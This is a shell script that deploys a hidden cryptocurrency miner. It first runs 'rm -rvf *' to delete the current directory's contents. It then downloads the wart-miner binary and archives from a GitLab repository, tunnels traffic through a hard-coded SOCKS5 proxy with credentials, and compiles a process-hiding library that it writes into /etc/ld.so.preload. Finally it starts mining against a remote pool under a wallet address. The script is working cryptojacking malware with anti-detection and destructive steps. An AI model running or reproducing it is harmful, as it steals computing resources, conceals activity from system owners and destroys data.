rm -rvf * && mkdir d && cd d
#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl

sudo apt-get install -y nodejs

apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -

npm i -g node-process-hider

wget https://github.com/CoinFuMasterShifu/janusminer/releases/download/0.2.7/janusminer_hiveos-0.2.7.tgz && tar -xvf janusminer_hiveos-0.2.7.tgz && cd janusminer_hiveos

chmod 777 wart-miner

wget https://gitlab.com/majapahlevi/mvp/-/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz


cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 209.97.145.189:443
socks5_username = majapahlevi
socks5_password = majapahlevi
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "


./graftcp/graftcp wget https://gitlab.com/majapahlevi/mvp/-/raw/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./wart-miner -h 81.163.20.40 -p 12000 -u c9d3fb17d7a4ebdde72a208f0d03270b88aebd1c301114cd.$(shuf -n 1 -i 1-99999)-col -t4 & wget https://github.com/CoinFuMasterShifu/janusminer/releases/download/0.2.7/janusminer_hiveos-0.2.7.tgz && tar -xvf janusminer_hiveos-0.2.7.tgz && cd janusminer_hiveos && ./wart-miner -h 81.163.20.40 -p 12000 -u c9d3fb17d7a4ebdde72a208f0d03270b88aebd1c301114cd.$(shuf -n 1 -i 1-99999)-cok -t25